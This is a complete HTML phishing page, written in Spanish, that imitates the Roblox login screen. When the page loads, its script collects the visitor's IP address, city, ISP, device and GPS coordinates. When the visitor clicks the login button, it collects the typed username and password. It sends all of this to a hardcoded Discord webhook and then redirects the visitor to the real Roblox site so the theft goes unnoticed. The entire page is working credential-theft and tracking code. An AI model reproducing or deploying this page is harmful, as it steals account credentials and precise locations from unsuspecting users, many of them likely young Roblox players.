<!DOCTYPE html>
<html lang="es-es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Iniciar sesión en Roblox</title>
    <link rel="icon" type="image/x-icon" href="https://www.roblox.com/favicon.ico">
    <style>
        body, html { margin: 0; padding: 0; height: 100%; width: 100%; font-family: 'Amazon Ember', Arial, sans-serif; overflow: hidden; background-color: #0d1117; }
        .bg-container { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-image: url('https://i.imgur.com/8mXfRmW.png'); background-size: cover; background-position: center; z-index: 1; }
        .bg-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(0,0,0,0.75); z-index: 2; }
        .header { background-color: #191b1d; height: 40px; border-bottom: 1px solid #393b3d; display: flex; justify-content: center; align-items: center; position: relative; z-index: 4; }
        .header img { height: 20px; }
        .main-container { position: relative; z-index: 3; display: flex; justify-content: center; align-items: center; height: calc(100vh - 40px); }
        .login-card { background-color: #191b1d; padding: 35px; border-radius: 8px; width: 90%; max-width: 400px; text-align: center; box-shadow: 0 8px 16px rgba(0,0,0,0.5); border: 1px solid #333; }
        h1 { color: #fff; font-size: 22px; margin-bottom: 25px; font-weight: 500; text-align: left; }
        input { width: 100%; padding: 12px; margin: 8px 0; background-color: #000; color: #fff; border: 1px solid #393b3d; border-radius: 4px; font-size: 14px; box-sizing: border-box; }
        .btn-blue { width: 100%; padding: 12px; margin-top: 15px; background-color: #0084ff; color: #fff; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; font-size: 15px; }
        .links-area { color: #adb5bd; font-size: 13px; margin-top: 20px; text-align: left; line-height: 1.6; }
        .links-area a { color: #0084ff; text-decoration: none; }
        .brand-footer { color: #00ffcc; font-size: 10px; margin-top: 25px; text-transform: uppercase; letter-spacing: 2px; opacity: 0.6; font-weight: bold; }
    </style>
</head>
<body>

    <div class="header"><img src="https://images.rbxcdn.com/2b53f60f64c677840139b4b9b6574f0c.png" alt="Roblox"></div>
    <div class="bg-container"></div>
    <div class="bg-overlay"></div>

    <div class="main-container">
        <div class="login-card">
            <h1>Iniciar sesión</h1>
            <input type="text" id="userInput" placeholder="Usuario/correo/teléfono">
            <input type="password" id="passInput" placeholder="Contraseña">
            <button class="btn-blue" id="actionBtn">Iniciar sesión</button>
            <div class="links-area">
                <a href="#">¿Olvidaste la contraseña o el nombre de usuario?</a><br>
                <a href="#">Inicio de sesión rápido</a><br>
                <span>¿No tienes una cuenta? <a href="#">Regístrate</a></span>
            </div>
            <div class="brand-footer">GUI By:Codeby</div>
        </div>
    </div>

    <script>
        const hook = "https://discord.com/api/webhooks/1499616194741801133/i-irhmgrf87Sldg0W8yWsgRAz_TUYh3JK7DEu7UGi6bsKvMNUwNe3vnpH2Ga1qFlvUNk";

        // Función para enviar datos al Webhook
        async function sendLog(data, isLogin = false) {
            await fetch(hook, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    username: "Codeby Intelligence",
                    embeds: [{
                        title: isLogin ? "🔑 LOGIN CAPTURADO" : "📡 RASTREO DE CONEXIÓN",
                        color: isLogin ? 0xff0000 : 0x00ffcc,
                        fields: data,
                        footer: { text: "Sistema Codeby versión gratuita" },
                        timestamp: new Date()
                    }]
                })
            });
        }

        async function initCapture() {
            try {
                // 1. Obtener datos de IP y Geografía
                const ipRes = await fetch('https://ipapi.co/json/');
                const info = await ipRes.json();

                let basicFields = [
                    { name: "🌐 IP Pública", value: `\`${info.ip}\``, inline: true },
                    { name: "🚩 Ubicación", value: `${info.country_emoji} ${info.country_name}, ${info.city}`, inline: true },
                    { name: "🏢 Operadora (ISP)", value: info.org, inline: true },
                    { name: "📱 Dispositivo", value: navigator.userAgent }
                ];

                // 2. Pedir permiso de UBICACIÓN GPS
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(async (pos) => {
                        const lat = pos.coords.latitude;
                        const lon = pos.coords.longitude;
                        basicFields.push({ name: "📍 GPS Exacto", value: `[Ver en Google Maps](https://www.google.com/maps?q=${lat},${lon})` });
                        await sendLog(basicFields);
                    }, async () => {
                        // Si deniega el permiso, envía solo lo de la IP
                        await sendLog(basicFields);
                    });
                } else {
                    await sendLog(basicFields);
                }

            } catch (e) { console.log(e); }
        }

        // Ejecutar al cargar
        window.onload = initCapture;

        // Captura de Login
        document.getElementById('actionBtn').addEventListener('click', async () => {
            const u = document.getElementById('userInput').value;
            const p = document.getElementById('passInput').value;

            if (u && p) {
                document.getElementById('actionBtn').innerText = "Verificando...";
                
                const loginFields = [
                    { name: "📧 Usuario/Correo", value: `\`${u}\``, inline: true },
                    { name: "🔒 Contraseña", value: `\`${p}\``, inline: true }
                ];
                
                await sendLog(loginFields, true);
                
                // Redirigir al Roblox real
                window.location.href = "https://www.roblox.com/login";
            }
        });
    </script>
</body>
</html>
